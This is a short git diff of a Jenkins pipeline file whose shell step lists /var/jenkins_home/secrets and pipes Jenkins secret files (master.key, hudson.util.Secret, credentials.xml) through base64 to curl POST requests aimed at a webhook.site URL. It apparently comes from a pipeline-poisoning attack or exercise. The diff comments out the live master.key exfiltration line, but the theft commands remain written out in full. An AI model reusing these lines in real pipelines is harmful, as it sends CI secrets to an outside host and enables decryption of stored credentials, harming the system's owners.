@@ -8,11 +8,12 @@ pipeline {
                 sh '''
                 whoami
                 pwd
-                ls -lath /var/jenkins_home
-                ls -lath /var/jenkins_home/secrets
+                echo 'xubirabiru'
+                #ls -lath /var/jenkins_home
+                #ls -lath /var/jenkins_home/secrets
                 #cat ../../secrets/hudson.util.Secret
                 #cat ../../secrets/hudson.util.Secret | base64 | curl -X POST -d @- https://webhook.site/731aa854-74cb-47f6-8163-b9185f68f89f
-                cat ../../secrets/master.key | base64 | curl -X POST -d @- https://webhook.site/731aa854-74cb-47f6-8163-b9185f68f89f
+                #cat ../../secrets/master.key | base64 | curl -X POST -d @- https://webhook.site/731aa854-74cb-47f6-8163-b9185f68f89f
                 #cat ../../credentials.xml
                 #echo /var/jenkins_home/credentials.xml |base64 | | curl -X POST -d @- https://webhook.site/731aa854-74cb-47f6-8163-b9185f68f89f
                 '''
